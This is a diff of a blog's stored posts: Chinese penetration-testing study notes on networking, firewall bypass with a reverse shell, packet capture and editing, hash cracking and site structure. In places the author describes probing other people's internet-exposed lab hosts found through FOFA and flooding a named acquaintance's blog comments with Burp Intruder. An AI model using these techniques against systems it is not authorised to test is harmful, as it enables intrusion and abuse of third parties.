+<p>路，就是「必由之路」中的路。由，就是「必由之路」中的由（由是经过、缘由的意思）。所有的信息都要经过路由器，然后被指向一条它该去的路。<br>也就是说内网和外网就像两个隔绝的空间，无法互通，唯一的联通点就是路由器（因为路由器既有外网 IP 也有内网 IP），所以路由器有时候也被叫做「网关」，这个「关」是「一夫当关，万夫莫开」的「关」。如果路由器到电信的连接中断了，那么内网中所有的设备也就无法上网了。（这很好理解，相当于唯一一条出去的路断了）</p>
+</li>
+<li><p><strong>内网能访问内网么？</strong></p>
+<p>内网中的设备可以互相访问（比如你可以用电脑或手机进入 <a href="https://link.zhihu.com/?target=http://192.168.1.1">http://192.168.1.1</a> 来查看你的路由器），但是不能直接访问外网，内网设备想要访问外网，就必须经过路由器中转。</p>
+</li>
+<li><p><strong>外网能访问外网么？</strong></p>
+<p>外网中的设备可以互相访问（比如 <a href="https://link.zhihu.com/?target=http://qq.com">http://qq.com</a> 可以把首页发送给你的路由器，你的路由器有外网 IP），但是外网中的设备无法访问你的内网设备（这很好理解，内网是一个封闭的网络，外人进不来，所以实际上 <a href="https://link.zhihu.com/?target=http://qq.com">http://qq.com</a> 无法直接把首页放送给你的电脑和手机</p>
+<p><strong>来源于<a href="https://zhuanlan.zhihu.com/p/34521011">HTTP访问要素：IP 与 端口 - 知乎 (zhihu.com)</a></strong></p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711110331630.png" alt="image-20240711110331630"></p>
+<h2 id="2-防火墙："><a href="#2-防火墙：" class="headerlink" title="2.防火墙："></a>2.防火墙：</h2><p>xzb666-hub <strong>&lt;–&gt;</strong> aliyun</p>
+<p>xzb666-hub防火墙 <strong>–&gt;</strong> aliyun</p>
+<p>aliyun <strong>!- &gt;</strong> xzb666防火墙</p>
+<p><strong>这里准备两台外网主机，查看两台主机之间是否能够正常通讯</strong> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711145047314.png" alt="image-20240711145047314"></p>
+<p>也就是像现在这样，<strong>两台服务器之间通过nc建立了反弹shell的基本操作</strong></p>
+<p>然后可以发现二者都可以充当监听端，被监听端.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711151136536.png" alt="image-20240711151136536"></p>
+<p><strong>当防火墙开启时，发现连接超时，说明入站的数据被严格过滤了，也就是说经过这一层防火墙的拦截，服务端哪怕成功被我们建立起监听也无法接收对应的弹shell等操作，也就是说吗，这里我们想要把cmd.exe弹过去想经过防火墙这一层简直是天方夜谭</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hriyt8rqkwj30xd0xinbv.jpg" alt="img"></p>
+<p>这也是个很生草的问题，因此我们开始用防火墙开发者的角度思考问题，便出现了一个奇妙的思路</p>
+<p><strong>防火墙绕过-正向链接&amp;反向连接&amp;内网服务器</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711150850670.png" alt="image-20240711150850670"></p>
+<p>防火墙有个特性，对入站的数据很严格，对出站的数据便放的很松，这类似于SQL注入中的一个分类，就是SQL二次注入的原理desu喵，<strong>假如我们通过服务端这里作为发出cmd.exe的对象，这时由于部署防火墙的服务端对出站的数据过滤的不是很严格，</strong>，因此shell成功被另一台外网主机所接收，这样的绕过也就可以实现了喵!!!</p>
+<p><strong>所以以后碰上防火墙的部署的话，尽量让它出来找你而不是让你出来找它，让它主动把数据给你而不是你找它讨！这样卑微desu！</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hfdyq4d43tj30u00u0q74.jpg" alt="img"></p>
+<h2 id="有手就行的实战desu"><a href="#有手就行的实战desu" class="headerlink" title="有手就行的实战desu"></a>有手就行的实战desu</h2><p>这里用fofa搜索对应的pikachu靶场，来打打同行（doge）</p>
+<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQozfTZKNXRTR0quy3Ca3nmSgkKsfM76uQn_g&s" alt="永雏塔菲手机壁纸- 抖音"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711153357307.png" alt="image-20240711153357307"></p>
+<p>然后这里打到了某个ip，发现功能齐全（阴险desu  打算开始做进一步入侵</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711153516754.png" alt="image-20240711153516754"></p>
+<p>–后续不具体做展示desu</p>
+<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQozfTZKNXRTR0quy3Ca3nmSgkKsfM76uQn_g&s" alt="永雏塔菲手机壁纸- 抖音"></p>
+<h1 id="Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#Day2-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="Day2:Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"></a>Day2:Web应用-架构搭建-漏洞-HTTP数据包-代理服务器</h1><h1 id="网站搭建前置知识"><a href="#网站搭建前置知识" class="headerlink" title="网站搭建前置知识"></a>网站搭建前置知识</h1><p>#域名，子域名，DNS，HTTP&#x2F;HTTPS，证书等</p>
+<p>第一步：准备域名，可以通过阿里云购买，服务器同理</p>
+<p>PS：倘若域名没有经过备案，那么这个域名在运营过程中只能对大陆以外的服务器进行解析，这个时候服务器可以选择香港、新加坡等离国内较近的服务器desu，（备案是需要很长时间的，如果比较急的话就没必要）</p>
+<p>第二步：将服务器基本配置配好过后，对域名进行解析，并利用阿里云自带的管理系统开始搭建网站</p>
+<p>第三步：这个时候小白可以通过宝塔平台一键搭建网站</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712161427668.png" alt="image-20240712161427668"></p>
+<h2 id="一些进阶的参考资料"><a href="#一些进阶的参考资料" class="headerlink" title="一些进阶的参考资料"></a>一些进阶的参考资料</h2><p><a href="https://blog.csdn.net/zhyl8157121/article/details/100551592">如何给你的网站套上Cloudflare（以阿里云为例）_如何套用cloudlfare-CSDN博客</a></p>
+<h1 id="Web应用环境的架构"><a href="#Web应用环境的架构" class="headerlink" title="Web应用环境的架构"></a>Web应用环境的架构</h1><p>理解不同WEB应用组成角色功能架：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712094332684.png" alt="image-20240712094332684"></p>
+<p>不同的架构自然可能出现的安全漏洞不同</p>
+<h1 id="Web安全漏洞分类"><a href="#Web安全漏洞分类" class="headerlink" title="Web安全漏洞分类"></a>Web安全漏洞分类</h1><p>这里不过多赘述</p>
+<p>但需要明白一个原理</p>
+<p>如图的这些漏洞都是代码实现功能过程中代码不够完善从而出现的</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712094451574.png" alt="image-20240712094451574"></h1><p>同时，根据上述架构的分类：从语言上，中间件层面上，服务器操作系统等不同层面上都会出现一些安全问题。</p>
+<h1 id="HTTP数据包和代理"><a href="#HTTP数据包和代理" class="headerlink" title="HTTP数据包和代理"></a>HTTP数据包和代理</h1><p>图示是一个最基本的请求图示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712095029242.png" alt="image-20240712095029242"></p>
+<p>加入所谓的代理拦截后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712095104496.png" alt="image-20240712095104496"></p>
+<p>浏览器先传入代理，代理再传入服务器，对应的返回的过程也需要经过代理的中转。 </p>
+<h2 id="案例–pax学长的评论区desu！！"><a href="#案例–pax学长的评论区desu！！" class="headerlink" title="案例–pax学长的评论区desu！！"></a>案例–pax学长的评论区desu！！</h2><p><strong>比方说我们对某个网站点赞</strong></p>
+<p>这里找到了pax学长的博客，随便点开一篇博文，发现其评论区功能正常运营，并且有点赞功能。Satoru打算套上Sherlock的马甲干点坏事情，发现Pax所用的butterfly框架甚至连头像都自动爬取上传好了（替你造马甲的框架，他真的，我哭死） 接下来准备进行对评论刷赞，看看是否成立</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712100613082.png" alt="image-20240712100613082"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712110446321.png" alt="image-20240712110446321"></p>
+<p>这里对点赞请求进行抓包，本想通过User-Agent在不同的浏览器中对同一个id点赞，但发现由于token机制，以作者当前的水平想实现python脚本自动化抓取token是很困难的，因此转换另一个思路，抓取评论时的请求，通过Burp Intruder不断构造新的评论，开始炸库。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712111235234.png" alt="image-20240712111235234"></p>
+<p>不断构造评论显然是可以实现的，毕竟是评论区自带的功能，不过利用这点依然是可以搞一些事情的</p>
+<p>首先这个评论区功能是支持上传文件的，如果我上传一系列图片进去，是否有可能拖垮pax博客的负载？</p>
+<p>同时这个马甲是支持信息伪造的，假设我传入一些有害网站作为个人马甲，这是否又是一层攻击？</p>
+<p>再不济，我挂着Burp Intruder模块批量发包，积少成多的同时并且在pax的所有文章下发送一些无用信息，这只是拖累负载而已，但假设我传入的是有害的信息呢？这也是需要考虑的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712111940495.png" alt="image-20240712111940495"></p>
+<h1 id="Day3-基础入门-抓包-封包-APP-小程序-PC应用-Web应用"><a href="#Day3-基础入门-抓包-封包-APP-小程序-PC应用-Web应用" class="headerlink" title="Day3:基础入门-抓包&amp;封包&amp;APP&amp;小程序&amp;PC应用&amp;Web应用"></a>Day3:基础入门-抓包&amp;封包&amp;APP&amp;小程序&amp;PC应用&amp;Web应用</h1><h1 id="学会对不同对象采用不同抓包封包抓取"><a href="#学会对不同对象采用不同抓包封包抓取" class="headerlink" title="学会对不同对象采用不同抓包封包抓取"></a>学会对不同对象采用不同抓包封包抓取</h1><p>什么是抓包：</p>
+<p>抓包就是抓取相关应用的一些数据，如果我们进行安全测试的话，有些应用的目标是会直接给到你的，但有些目标却是未知的</p>
+<p>对于这些看不见的目标，我们可以通过抓取数据包来解决。</p>
+<p>很经典的web流程，在任意一个浏览器通过F12打开网络（或者叫做networkl）</p>
+<p>这个时候浏览器会起一个监听的进程，用于抓取基本的数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714153412205.png" alt="image-20240714153412205"></p>
+<p>这就是很经典的一个单纯抓包，并没有对数据包做任何的额外操作。</p>
+<p>同时对应的它也会展示一些加载的资源，比如前端展示的js或css等</p>
+<p>还有一种可能，数据包是会被封装在微信小程序，app或者一些电脑的应用中，这个时候就需要一些专门的工具用于模拟对应的环境</p>
+<h1 id="抓包应用对象"><a href="#抓包应用对象" class="headerlink" title="抓包应用对象"></a>抓包应用对象</h1><h2 id="WEB应用站点（网站）"><a href="#WEB应用站点（网站）" class="headerlink" title="WEB应用站点（网站）"></a>WEB应用站点（网站）</h2><p>浏览器审查查看元素网络监听</p>
+<h2 id="APP-小程序-PC抓包-HTTP-S数据-—Burpsuite-Charles-Fiddler"><a href="#APP-小程序-PC抓包-HTTP-S数据-—Burpsuite-Charles-Fiddler" class="headerlink" title="APP&amp;小程序&amp;PC抓包-HTTP&#x2F;S数据  —Burpsuite&amp;Charles&amp;Fiddler"></a>APP&amp;小程序&amp;PC抓包-HTTP&#x2F;S数据  —Burpsuite&amp;Charles&amp;Fiddler</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境配置</span><br><span class="line">1、安卓模拟器安装搭建：</span><br><span class="line">雷电、逍遥、夜神等自行安装</span><br><span class="line">2、工具相关证书安装</span><br><span class="line">Burpsuite&amp;Charles&amp;Fiddler</span><br><span class="line">这三样工具看自己使用的是哪一样，对应的看工具官方手册或一些教程即可安装对应的证书</span><br><span class="line">3.封包抓取</span><br></pre></td></tr></table></figure>
+
+<p>对应的记得安装证书，修改模拟器代理即可</p>
+<p>在这里个人建议使用Charles配合Burpsuite，对小程序和app等进行抓包也可以直接配合手机使用，这里也有配套的教程.</p>
+<h2 id="程序进程-网络接口-其他协议抓包-–-Wireshark-科来网络分析系统"><a href="#程序进程-网络接口-其他协议抓包-–-Wireshark-科来网络分析系统" class="headerlink" title="程序进程&amp;网络接口&amp;其他协议抓包 – Wireshark&amp;科来网络分析系统"></a>程序进程&amp;网络接口&amp;其他协议抓包 – Wireshark&amp;科来网络分析系统</h2><p>当有一些程序走的是非web协议，这个时候burp和charles本质上是派不上用场的，这个时候我们也可以选择使用wireshark抓到类似UDP协议和IDMP协议等。</p>
+<h2 id="通讯类应用封包分析发送接收-–WPE四件套封包-科来网络分析系统"><a href="#通讯类应用封包分析发送接收-–WPE四件套封包-科来网络分析系统" class="headerlink" title="通讯类应用封包分析发送接收 –WPE四件套封包&amp;科来网络分析系统"></a>通讯类应用封包分析发送接收 –WPE四件套封包&amp;科来网络分析系统</h2><p>封包和抓包是两个本质不同的概念，对通讯类应用，比如游戏这类实时交互的进程，在不断产生流量交互的应用，使用对应的网络分析系统对本机的流量包进行分析，然后对协议的状态进行对应的观察</p>
+<p>比方说<strong>打开模拟器，想要抓取某传奇手游的数据包</strong>。</p>
+<p>这个时候利用科来网络分析系统对模拟器网段流量进行分析，可以通过TCP的状态发掘正在运行的进程，通过排除法（在模拟器中开始畅玩游戏（），发现相对较活跃的流量）可以发现当前运行的数据包中哪个是对应游戏的数据包喵</p>
+<p><strong>类似这种游戏，一般走的都是TCP协议</strong>，因为HTTP使用请求-响应模型，客户端发送请求，服务器返回响应。因此HTTP模型适合于Web浏览中一次性数据获取的场景却不适用于游戏。</p>
+<p>可能这个时候就会有人问了：SatoruSatoru，<strong>这哪里是Web渗透啊？分明就是抓包而已，这能有啥？</strong></p>
+<p>Satoru这个时候就会说了：<strong>抓个包其实是很简单的事，但是拿到真实IP开始扫描资产，看看端口上其他的服务这种操作就要考虑的很多了（套用公式就是快）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714210927280.png" alt="image-20240714210927280"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714210940142.png" alt="image-20240714210940142"></p>
+<h2 id="真正意义上的封包技术"><a href="#真正意义上的封包技术" class="headerlink" title="真正意义上的封包技术"></a>真正意义上的封包技术</h2><p>详解wpe封包：</p>
+<p>WPE是一个强大的网络封包编辑器，它可以截取网络上的信息，修改封包的数据，一般在安全测试中可以用来调试数据通讯的地址</p>
+<p>封包指将网络传输过程中封片传输的数据，比方说一个游戏中，回城由十个数据包组成，那么WPE对我们发送的数据包进行整合封装，将分片传输的数据重新整合成一套数据包，然后重新发送，达到在游戏外实现功能的效果</p>
+<h3 id="封包概念解释"><a href="#封包概念解释" class="headerlink" title="封包概念解释"></a>封包概念解释</h3><p><strong>封包（Packet）</strong> 是指在网络通信中，数据被分割成小块并通过网络传输的基本单位。每个封包通常包括头部（Header）和数据（Data）部分：</p>
+<ul>
+<li><strong>头部</strong>：包含控制信息，例如源地址、目的地址、序列号、协议信息等。</li>
+<li><strong>数据</strong>：实际传输的数据内容。</li>
+</ul>
+<p>封包在网络中传输时，通过路由器和交换机等设备进行传递，最终到达目的地。封包技术是网络通信的基础，通过将大块数据分割成小块，可以实现高效和可靠的传输。</p>
+<h3 id="封包编辑（Packet-Editing）"><a href="#封包编辑（Packet-Editing）" class="headerlink" title="封包编辑（Packet Editing）"></a>封包编辑（Packet Editing）</h3><p>封包编辑指的是捕获、分析、修改和重放网络封包的过程。这通常用于网络调试、性能测试、漏洞利用等场景。WPE（Winsock Packet Editor）是常用的封包编辑工具之一。</p>
+<h3 id="WPE（Winsock-Packet-Editor）封包编辑技术"><a href="#WPE（Winsock-Packet-Editor）封包编辑技术" class="headerlink" title="WPE（Winsock Packet Editor）封包编辑技术"></a>WPE（Winsock Packet Editor）封包编辑技术</h3><p>WPE Pro 是一种流行的网络封包编辑工具，用于捕获和修改通过 Windows 网络堆栈传输的数据包。以下是使用 WPE 进行封包编辑的步骤：</p>
+<h4 id="1-下载并安装-WPE-Pro"><a href="#1-下载并安装-WPE-Pro" class="headerlink" title="1.下载并安装 WPE Pro"></a>1.下载并安装 WPE Pro</h4><p>首先，从可信的来源下载并安装 WPE Pro。</p>
+<h4 id="2-打开目标程序"><a href="#2-打开目标程序" class="headerlink" title="2. 打开目标程序"></a>2. 打开目标程序</h4><p>启动你想要捕获和编辑封包的应用程序。例如，一个网络游戏或聊天程序。</p>
+<h4 id="3-启动-WPE-Pro"><a href="#3-启动-WPE-Pro" class="headerlink" title="3. 启动 WPE Pro"></a>3. 启动 WPE Pro</h4><p>启动 WPE Pro，并在工具界面中选择“Target Program”按钮，选择你要监控的目标程序。</p>
+<h4 id="4-捕获封包"><a href="#4-捕获封包" class="headerlink" title="4. 捕获封包"></a>4. 捕获封包</h4><p>在 WPE Pro 中，点击“Play”按钮开始捕获封包。然后在目标程序中执行一些操作（如发送消息、移动角色等）。</p>
+<h4 id="5-停止捕获并分析封包"><a href="#5-停止捕获并分析封包" class="headerlink" title="5. 停止捕获并分析封包"></a>5. 停止捕获并分析封包</h4><p>完成操作后，点击“Stop”按钮停止捕获。你将看到捕获到的封包列表。</p>
+<h4 id="6-修改封包"><a href="#6-修改封包" class="headerlink" title="6. 修改封包"></a>6. 修改封包</h4><p>选中你想要修改的封包，右键选择“Send”或“Send to Send List”。在“Send List”中，你可以编辑封包的数据内容。修改完成后，点击“Send”按钮发送修改后的封包。</p>
+<h4 id="示例步骤："><a href="#示例步骤：" class="headerlink" title="示例步骤："></a>示例步骤：</h4><p>假设你在一个在线游戏中想要修改发送的聊天消息：</p>
+<ol>
+<li>在游戏中发送一条消息（如“Hello”）。</li>
+<li>在 WPE Pro 中捕获到相应的封包。</li>
+<li>找到包含“Hello”消息的封包，右键选择“Send”或“Send to Send List”。</li>
+<li>在编辑器中将“Hello”修改为其他内容（如“Hi there”）。</li>
+<li>点击“Send”按钮发送修改后的封包，观察游戏中的变化。</li>
+</ol>
+<p>也可以封装一个回城功能（doge）,然后通过发送整合后的数据包就可以实现游戏外回城的功能（doge）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240714213902020.png" alt="image-20240714213902020"></p>
+<p>所以封包和wireshark监听查找进程的本质区别在于封包是一组整合的数据包，wireshark查找进程是一堆零散的数据包</p>
+<p>步骤：</p>
+<p>1.首先在模拟器中先装上代理机器人</p>
+<p>2.对应的打开ccproxy设置代理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">四件套示意图</span><br><span class="line">apk --&gt; ccproxy  --&gt;wpe监听cc进程，实现封包抓包</span><br><span class="line"></span><br><span class="line">burp charles</span><br><span class="line">模拟器设置证书后，设置代理，运行工具的本机IP 端口</span><br><span class="line">burpsuite茶杯 配置代理 监听抓取</span><br><span class="line"></span><br><span class="line">wireshark 科来  不需要设置任何东西</span><br><span class="line">只是监听全频段网络接口</span><br></pre></td></tr></table></figure>
+
+<p>这里也可以用<strong>下雪的傻瓜式封包监听工具</strong>，不过现在一般模拟器都已经上了一层防护了，不会轻易的让你使用模拟器对应的进程名，所以这个时候更新工具版本或者选择一些老版本模拟器（）说不定有奇效</p>
+<p>当然这是因为WPE工具已经太老了，基本的原理连逍遥安卓论坛都能讲明白，加上一层比较基本的防护器就可以防御住了，这后面再细说</p>
+<p>雷电模拟器的进程一般是这个</p>
+<p>X64进程名|Ld9BoxHeadless.exe|PID|30320</p>
+<p>但是进程ID可能会实时改变（？）</p>
+<p>在我封包成功一次过后雷电模拟器好像把PID给换了，细思极恐</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715145004014.png" alt="image-20240715145004014"></p>
+<h1 id="抓包应用协议"><a href="#抓包应用协议" class="headerlink" title="抓包应用协议"></a>抓包应用协议</h1><p>分为Web协议和非Web协议</p>
+<h1 id="抓包应用意义"><a href="#抓包应用意义" class="headerlink" title="抓包应用意义"></a>抓包应用意义</h1><p>把app中的一些数据或者一些信息提取出来，就是这么简单，然后将这些信息用于对应的安全攻防。</p>
+<h1 id="封包应用意义"><a href="#封包应用意义" class="headerlink" title="封包应用意义"></a>封包应用意义</h1><p><strong>WPE四件套封包&amp;科来网络分析系统  Wireshark</strong></p>
+<p><strong>Burpsuite&amp;Charles&amp;Fiddler</strong></p>
+<h2 id="傻瓜式封包流程"><a href="#傻瓜式封包流程" class="headerlink" title="傻瓜式封包流程"></a>傻瓜式封包流程</h2><p>封包工具可以将类似于游戏这种实时交互的网站做完整的监听而非拦截</p>
+<h3 id="进程获取"><a href="#进程获取" class="headerlink" title="进程获取"></a>进程获取</h3><p>没有发现模拟器对应的进程，那么封包也是天方夜谭</p>
+<p>首先通过Wireshark或者科来网络分析系统监听本机进程，并在游戏中多进行释放技能，领取奖励等数据包交互很多的操作，可以发现对应的字节波动大的进程，通过进程名推敲一下看看是否就是这个模拟器的进程。</p>
+<h3 id="最后封包"><a href="#最后封包" class="headerlink" title="最后封包"></a>最后封包</h3><p>后续直接用封包工具对模拟器起一个监听，然后打开监听，在游戏内进行想要封包的操作（例如回城等），点击回城后关闭监听开始测试抓取到的数据包，如果选中的数据包发送后能够成功实现该功能，则说明封包成功（虽然Burpsuite其实也能做到直接监听对应模拟器配置的虚拟网卡）</p>
+<h2 id="进阶封包流程"><a href="#进阶封包流程" class="headerlink" title="进阶封包流程"></a>进阶封包流程</h2><p>进阶的封包无非是在模拟器中装入代理机器人，后续代理机器人将抓到的数据包传回到本机的CCproxy（也是工具），CCproxy对应的进程则被WPE所监听，但由于这个流程已经太老了，模拟器以及游戏本身可能都有对应的防护，所以一般傻瓜式封包会比进阶封包更容易抓到包。</p>
+<p><strong>后续有条件一定要自己尝试写出来封包监听工具，毕竟公开的工具会被ban，但公开的原理不会，通过进阶封包这里学得原理，自己做个封包监听工具又有何不可呢。</strong></p>
 ]]></content>
       <categories>
         <category>Penetration Testing Basic</category>
       </categories>
       <tags>
-        <tag>info</tag>
+        <tag>pr0gram</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从0开始的渗透Day4-6desu</title>
+    <url>/2024/07/15/%E4%BB%8E3%E5%BC%80%E5%A7%8B%E7%9A%84%E6%B8%97%E9%80%8F1/</url>
+    <content><![CDATA[<h1 id="如读者有未授权渗透行为，后果自负，本站仅作学习用途"><a href="#如读者有未授权渗透行为，后果自负，本站仅作学习用途" class="headerlink" title="如读者有未授权渗透行为，后果自负，本站仅作学习用途"></a>如读者有未授权渗透行为，后果自负，本站仅作学习用途</h1><h1 id="Day4-30余种加解密编码进制-Web-数据库-系统-代码-参数值"><a href="#Day4-30余种加解密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="Day4:30余种加解密编码进制&amp;Web &amp;数据库&amp;系统&amp;代码&amp;参数值"></a>Day4:30余种加解密编码进制&amp;Web &amp;数据库&amp;系统&amp;代码&amp;参数值</h1><h2 id="加解密编码进制"><a href="#加解密编码进制" class="headerlink" title="加解密编码进制"></a>加解密编码进制</h2><p>识别算法编码类型</p>
+<p>1.看密文位数</p>
+<p>2.看密文的特征（数字，字符，大小写，符号等）</p>
+<p>3.看当前密文存在的地方（Web，数据库，操作系统等应用）</p>
+<p>演示案例如下，接下来会从这些方面出发</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715163704329.png" alt="image-20240715163704329"></p>
+<p>详细列举</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715163856227.png" alt="image-20240715163856227"></p>
+<p>对于一些密码算法，类似md5这类不可逆的密码算法</p>
+<p>这个时候解密的方式就有：<strong>枚举和碰撞</strong></p>
+<p><strong>解密不通过算法解密，而是尝试生成很多的加密或对应明文的字符来枚举</strong></p>
+<p>同时加密的应用场景比较多，这里列举出这些</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715164423363.png" alt="image-20240715164423363"></p>
+<p>加密存储相对明文存储而言，不同之处就在于在攻防过程中，如果你的密文设置的足够复杂，其实也可以防止攻击端进一步攻击网络资产。</p>
+<p>—-1—</p>
+<p>类似于最基本的md5加密，类似个人博客这种最基本的站点，一般会采取md5加密，这个时候假设你进入了数据库，可以直接利用某些线上工具完成解密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715170018370.png" alt="10"></p>
+<p>—2—</p>
+<p>对应了<strong>国外论坛discuz类的站点</strong>采用了md5+salt加密的方式，在本身就用md5加密的条件下还额外加入了“salt“字段，这个时候使加密更加完善，攻击者在未知网站信息或存储机制的情况下难以进一步操作</p>
+<p>不过还是有机会通过一些信息的收集得知其加密的机制的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715165911780.png" alt="image-20240715165911780"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715170242476.png" alt="image-20240715170242476"></p>
+<p>密算法是不可能第一时间就能知道的，而是要对这个站点采取信息收集，收集过后找到对应的架构是怎么样的**(Web站点之间的不同？还是对应想要查看的是某个操作系统？)**，架构知道了，那么这个加密算法具体怎么实现的也就可以通过网上的信息，甚至是自己搭一个这样的站点，对应这些思路自然也就一通百通。</p>
+<p>这里介绍一个工具，mimikatz，它是用于获取windows系统上所有的明文和密钥进行获取。 不过这个不一定有用，因为mimikatz对应在windows2008后版本取消显示明文密码过后，作用并不是那么明显。</p>
+<p>不过从这里可以看出，不管是什么样的架构都有迹可循。</p>
+<p>这样就能防止我们单纯的拿到明文过后却无计可施。 </p>
+<p><strong>不只是有存储类的加密</strong>，<strong>就连代码也会有对应的代码加密</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715205508717.png" alt="image-20240715205508717"></p>
+<p>对应的 数据库也有对应的密文加密方式</p>
+<p>以及浏览器也是对应有其加密方式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715211129660.png" alt="image-20240715211129660"></p>
+<p>这些只要掌握大概，以及懂得工具的使用就可以了</p>
+<h1 id="Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载均衡"><a href="#Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载均衡" class="headerlink" title="Day5：资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡"></a>Day5：资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</h1><p>本阶段复现可能需要基于<strong>阿里云服务器+完整备案后域名+宝塔面板&#x2F;github上自主部署服务。</strong></p>
+<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZqNyI04OHsCJqTXg5b9F0RmJpBNvbD9ZF0Q&s" alt="关注永雏塔菲谢谢喵什么梗- 抖音"></p>
+<h2 id="资产架构-端口-目录-插件接口-多站点-多应用"><a href="#资产架构-端口-目录-插件接口-多站点-多应用" class="headerlink" title="资产架构-端口&amp;目录&amp;插件接口&amp;多站点&amp;多应用"></a>资产架构-端口&amp;目录&amp;插件接口&amp;多站点&amp;多应用</h2><h3 id="站点结构"><a href="#站点结构" class="headerlink" title="站点结构"></a>站点结构</h3><h4 id="目录型"><a href="#目录型" class="headerlink" title="目录型"></a>目录型</h4><p> 这里由于Satoru前期部署网站和域名备案等琐事，时间线拉长的让人寒心，只能找Wells要了个子域名，所以这里也懒得用我已经部署好的网站重新演示一遍（主要是完整的站点目录我只拿着一个子域名也很难复现（戳手手））</p>
+<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHNG07AZ4KHRaS7k_YotkiGRnl7kIwbX9hMQ&s" alt="塔菲盒官方下载-永雏塔菲盒(Taffy盒)下载v1.0 安卓版-100手游网"></p>
+<p>这里已经通过域名解析服务器IP，后续宝塔面板一键部署该域名解析的服务器上实现了建站。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717095245678.png" alt="image-20240717095245678"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102335544.png" alt="image-20240717102335544"></p>
+<p>现在只是单独一个网站，那么假设我在对应的域名目录下新建除了这个网站目录之外的博客目录，并在里面部署网站的话，那么这个站点则也会出现在这个域名的目录结构下，那么会呈现的效果也就是这样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102620385.png" alt="image-20240717102620385"></p>
+<p>​					<strong>对应的目录型站点也就成立了</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102705476.png"></p>
+<p>结构也就显而易见了</p>
+<p><strong>bbs.xiaodi8.com —对应主目录网站</strong> </p>
+<p><strong>bbs.xiaodi8.com&#x2F;blog —wordpress程序</strong></p>
+<p>一个网站，两个程序，作为目录型站点，任何一个程序出现漏洞，都可以进入安全测试</p>
+<h4 id="端口型"><a href="#端口型" class="headerlink" title="端口型"></a>端口型</h4><p>新的网站部署过程中，可以采用对域名bbs.xiaodi8.com额外划出88端口这样的操作，这个时候也是实现了一个网站多个程序的效果</p>
